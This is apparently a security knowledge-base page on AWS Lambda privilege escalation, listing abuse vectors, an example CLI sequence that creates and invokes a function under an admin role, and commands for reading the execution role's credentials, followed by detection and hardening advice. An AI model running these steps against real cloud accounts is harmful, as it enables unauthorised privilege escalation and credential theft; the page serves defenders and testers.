---
title: "AWS Lambda privesc & abuse"
category: "cloud-security"
tags: ["aws", "lambda", "privesc", "serverless"]
platform: "aws"
mitre: ["T1078.004", "T1648"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# AWS Lambda privesc & abuse

## TL;DR
Lambda functions run with an execution role. If you can create/modify functions and pass a privileged role (`iam:PassRole` + `lambda:*`), you can run code as that role. Compromised functions also leak creds via env vars and the runtime credential endpoint.

## Privesc vectors
```text
lambda:CreateFunction + iam:PassRole  -> create a function with an admin role, invoke it
lambda:UpdateFunctionCode             -> overwrite an existing (privileged) function's code
lambda:AddPermission / *FunctionUrl   -> expose/invoke a function you shouldn't
lambda:UpdateFunctionConfiguration    -> change env/role, add layers with malicious code
Event source (S3/SQS/API GW) trigger  -> indirectly invoke privileged functions
```

## Example: create + invoke as an admin role
```bash
# Zip a function that dumps its own credentials / performs actions
aws lambda create-function --function-name pwn \
  --runtime python3.12 --role arn:aws:iam::123:role/AdminRole \
  --handler h.handler --zip-file fileb://f.zip
aws lambda invoke --function-name pwn out.json
```

## Credentials inside a compromised function
```bash
# The execution role's temporary creds are available to the running code:
echo $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_SESSION_TOKEN
# Also the AWS_CONTAINER_CREDENTIALS_FULL_URI / relative URI endpoint.
# Env vars may hold secrets (bad practice but common).
```

## Detection (Blue Team)
```text
CloudTrail: CreateFunction/UpdateFunctionCode/UpdateFunctionConfiguration,
            AddPermission, CreateFunctionUrlConfig, PassRole to Lambda.
GuardDuty:  anomalous Lambda behavior, credential exfiltration.
Signal:     new functions with high-privilege roles; code changes to sensitive functions.
```

## Mitigation / Hardening
- Least-privilege execution roles (one per function, scoped tightly).
- Restrict `iam:PassRole` (condition on `iam:PassedToService: lambda.amazonaws.com` + specific roles).
- No secrets in env vars — use Secrets Manager/Parameter Store; encrypt env vars with KMS.
- Code signing (Lambda code signing config), monitor function changes, function URL auth.

## Sources
- [AWS Lambda security](https://docs.aws.amazon.com/lambda/latest/dg/lambda-security.html) · [Rhino – AWS privesc](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
